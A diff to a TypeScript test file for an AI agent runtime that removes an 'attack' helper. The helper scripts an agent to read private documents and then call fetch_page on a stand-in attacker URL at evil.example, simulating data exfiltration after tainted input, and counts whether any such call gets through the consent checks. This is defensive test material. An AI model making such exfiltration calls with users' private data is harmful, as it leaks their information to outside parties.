@@ -70,31 +70,6 @@ const call = (tool: string, args: Record<string, unknown>) => reply(JSON.stringi
 const TOOLS = ["get_document", "get_selection", "get_headings", "read_file", "list_files", "file_exists", "search_workspace", "get_frontmatter", "list_tags", "extract_quotes", "fetch_page", "search_web"];
 const agent = (): AgentDefinition => ({ id: "summarise", description: "t", system: "Summarise.", user: (i) => `Task.\n\n${i.text ?? ""}`, tools: pickTools(...TOOLS), requires: ["network"], language: "any", maxRetries: 0, maxSteps: 12 });
 
-type Mode = "no-text" | "inputMayLeave";
-async function attack(read: [string, Record<string, unknown>], mode: Mode, opts: { taintFirst?: boolean; document?: string; path?: string } = {}) {
-  setAiPolicy("local-first");
-  const script: Array<[string, Record<string, unknown>]> = [
-    // A page first, when the vault read itself is not outside-classed: the run is tainted, nothing private yet.
-    ...(opts.taintFirst ? ([["fetch_page", { url: "https://page.example/a" }]] as Array<[string, Record<string, unknown>]>) : []),
-    read,
-    ["fetch_page", { url: EVIL }],
-    ["fetch_page", { url: EVIL.replace("c?", "d?") }],
-  ];
-  n = 0;
-  registerExecutor(fakeExecutor((_r, k) => (k <= script.length ? call(...script[k - 1]) : reply(JSON.stringify({ final: "done" })))));
-  const asks: unknown[] = [];
-  const input = mode === "no-text" ? {} : { text: "summarise my statement" };
-  await runAgent(agent(), input, {
-    grants: ["network"],
-    inputMayLeave: mode === "inputMayLeave",
-    ...(opts.document ? { document: opts.document, path: opts.path } : {}),
-    consentNetwork: (r: unknown) => (asks.push(r), false),
-    consentUntrusted: (r: unknown) => (asks.push(r), false),
-  } as never);
-  const out = net.mock.calls.filter(([u]: unknown[]) => /evil\.example/.test(decodeURIComponent(String(u)))).length;
-  return { asks: asks.length, out };
-}
-
 beforeEach(async () => {
   resetExecutors();
   await clearTrace();
